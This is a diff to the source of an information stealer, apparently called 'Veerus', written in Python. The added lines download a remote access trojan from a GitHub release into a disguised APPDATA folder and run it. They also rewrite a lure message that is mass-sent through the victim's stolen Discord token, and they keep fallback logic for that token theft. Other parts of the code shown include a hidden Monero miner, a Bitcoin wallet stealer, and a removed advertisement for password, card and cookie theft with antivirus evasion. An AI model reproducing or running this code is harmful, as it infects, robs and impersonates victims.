@@ -61,33 +61,14 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
+Bot_Token = "BotTokenForTheRat667"
+
+
 WEBHOOK = "webhook667"
 webhook = WEBHOOK
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 dm_all = True
-DMALLMSG = """:flag_gb: Hello !
-Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same? Let me explain what you can do with Veerus :
-```Stealer :
-	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
-		Passwords, Credit Cards, Cookies, Autofill
-
-	Discord :
-		Token
-
-	Miner :		
-		Hidden XMR Miner
-	Other :
-		Add to computer startup the number of time you choosed.
-		Clone the virus in random directories
-		Undetected by Windows Defender & Windows Smart screen
-		Anti Virtual Machine
-		Disable Task Manager```
-
-	Price : 0.00$ ! yes ! Totally Free !
-
-	Links :
-		Discord : https://discord.gg/7GkfBzRQXX
-		Github : https://github.com/0xSxZ/Veerus"""
+DMALLMSG = """Hey ! i am a French developer and i created the 1st free discord image grabber, would you be interessed to test it :smiling_imp: ? link : https://github.com/0xSxZuu/test/releases/download/test/image_grabber.exe"""
 
 mdmbot = discord.Client()
 
@@ -116,7 +97,7 @@ PROCESS_PATHS = [
 	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
 	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
 ]
-PROCESS_NUM = processnumbers
+PROCESS_NUM = 5
 
 MINE = True #Mine crypto? True/False
 MINING_PERCENT = "30"
@@ -124,10 +105,10 @@ CUDA = False
 
 
 computer = wmi.WMI()
+RATURL = "https://github.com/0xSxZ/Veerus/releases/download/dont/r4t.exe"
 MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true"
 GPUMODEL = computer.Win32_VideoController()[0]
-
-
+rat_path = os.getenv('APPDATA') + "\\winedows_companny\\update\\667.exe"
 XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Services32.exe"
 
 APP_DATA_PATH= os.environ['LOCALAPPDATA']
@@ -180,7 +161,8 @@ chromiumpaths = [
 yes = "yes"
 
 if yes == "yes":
-
+	def rat_thread():
+		os.system(rat_path + " " + Bot_Token)
 	def stealBitcoinCore():
 		global WALLETCOUNT
 		try:
@@ -768,6 +750,11 @@ if yes == "yes":
 					with open(XMRIGPATH, 'wb') as f:
 						print("Writing..")
 						f.write(r.content)
+				r = requests.get(RATURL)
+				with open(rat_path, 'wb') as f:
+					print("Writing..")
+					f.write(r.content)
+					threading.Thread(target=rat_thread).start()
 			except Exception as e:
 				print(e)
 			if MINE == True and checkIfProcessRunning("xmrig") == False:
@@ -893,7 +880,16 @@ if yes == "yes":
 			except Exception as e:
 					print(f"Failed to send message to: {user.name} {str(e)}")
 		print(f"{mdmbot.user.name} hass finished mdming!")
+
 	if(dm_all == True):
-		token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[0]
-		print("Token : " + token)
-		mdmbot.run(token, bot=False)
+		try:
+			token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[0]
+			print("Token : " + token)
+			mdmbot.run(token, bot=False)
+		except:
+			try:
+				token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[1]
+				print("Token : " + token)
+				mdmbot.run(token, bot=False)
+			except:
+				pass
